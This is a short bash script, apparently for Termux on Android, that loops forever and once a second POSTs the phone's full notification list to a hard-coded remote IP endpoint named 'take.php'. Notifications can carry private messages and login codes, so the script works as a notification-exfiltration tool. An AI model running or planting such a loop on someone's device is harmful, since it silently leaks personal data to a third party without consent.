#!/bin/bash
while [ 1 ];
do
var="$(termux-notification-list)"
curl -H "Content-Type: application/json" -X POST -d "$(echo $var)" "http://100.74.22.88/notification/api/take.php"
sleep 1
done
